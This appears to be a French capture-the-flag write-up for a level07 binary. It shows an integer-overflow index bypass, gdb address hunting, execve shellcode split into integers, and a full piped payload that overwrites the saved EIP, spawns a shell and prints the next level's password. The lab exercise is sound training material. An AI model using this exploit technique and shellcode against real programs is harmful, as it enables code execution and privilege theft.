On a un executable qui affiche un prompt, ce prompt nous permet de lancer 3 commandes :
- store
- read
- quit

*store* va stocker un unsigned int dans un tableau de taille 100

*read* va lire le tableau a un index specifie

et *quit* va tout simplement quitter le programme

apres avoir desassembler le code et fais quelques tests, on remarque de l'on peut ecrire sur la stack sans que le programme crash. Si l'on tape la commande *read* et qu'on choisit un index superieur a 100 le programme affiche les valeurs sans crash

le programme empeche d'inserer un nombre aux index multiple de 3 et les nombres compris dans l'intervalle [3070230528 >= nb <= 3087007743]

```
if ((index % 3) == 0 || number >> 24 == 183)
```

MAIS, on peut en realite inserer un nombre aux index divisible par 3, car dans ce programme l'index saisi va etre multiplie par 4, si on saisi (((MAX_UINT = 4294967295) + 1) / 4) = 1073741824 l'index [0] sera modifie

```
Input command: store
 Number: 5
 Index: 1073741824
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 5
 Completed read command successfully
```

on va donc utiliser cette faille pour inserer um shellcode au debut de notre tableau et on va ensuite ecrase la valeur de *eip* pour y mettre l'adresse de depart du tableau

on trouve l'adresse de notre tableau qui stock nos nombres en etant dans main (l'adresse est differente lorsqu'on change de fonction)

```
(gdb) disas main
...
0x080487a3 <+128>:   rep stos %eax,%es:(%edi)
...
(gdb) b *0x080487a3
Breakpoint 2 at 0x80487a3
(gdb) x $esp+0x24
0xffffd554:     0 <===
```

0xffffd554 = 4294956372 en decimal

on trouve l'adresse de *eip* lorsqu'on est dans le main

```
(gdb) b main 
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd720:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c <===
```

0xffffd71c = 4294956828 en decimal

il y a donc un ecart de (4294956824 - 4294956372 = 456 octets) entre le debut du tableau et *eip*, comme on avance de 4 en 4 on rentrera 456 / 4 = 114 comme index

on prend notre shellcode de 23 octets : "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

on le divise par 4 (taille d'un unsigned int) pour l'inserer au debut de notre tableau : 
- 6850c031 + 68732f2f + 69622f68 + 50e3896e + b0e18953 + 80cd0b
- 1750122545 + 1752379183 + 1768042344 + 1357089134 + 2967570771 + 8441099

on calcule nos index:
- 1073741824 = index 0
- 1073741827 = index 3
- 1073741938 = index 114

on trouve l'adresse du tableau lorsqu'on est dans la fonction store_number ou read_number (c'est pareil) pour savoir ou on lance notre shellcode lorsqu'on ecrasera *eip*

```
(gdb) b read_number 
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07
...
(gdb) x $ebp+0x8
0xffffd530:     0xffffd554
```

(0xffffd530 - 0xffffd554) / 4 = (4294956336 - 4294956372) / 4 = -36 / 4 = -9

on lance notre payload incomplet pour lire l'adresse a l'index [-9] (identique a index[4294967287])

```
echo -e 'store\n1750122545\n1073741824\nstore\n1752379183\n1\nstore\n1768042344\n2\nstore\n1357089134\n1073741827\nstore\n2967570771\n4\nstore\n8441099\n5\nread\n-9\nquit\n' | ./level07
...
Input command:  Index:  Number at data[4294967287] is 4294956404 <===
 Completed read command successfully
```

on peut maintenant lancer notre payload en entier

```
(echo -e 'store\n1750122545\n1073741824\nstore\n1752379183\n1\nstore\n1768042344\n2\nstore\n1357089134\n1073741827\nstore\n2967570771\n4\nstore\n8441099\n5\nread\n-9\nstore\n4294956404\n1073741938\nquit\n' ; cat) | ./level07
...
Input command:  Index:  Number at data[4294967287] is 4294956404
 Completed read command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```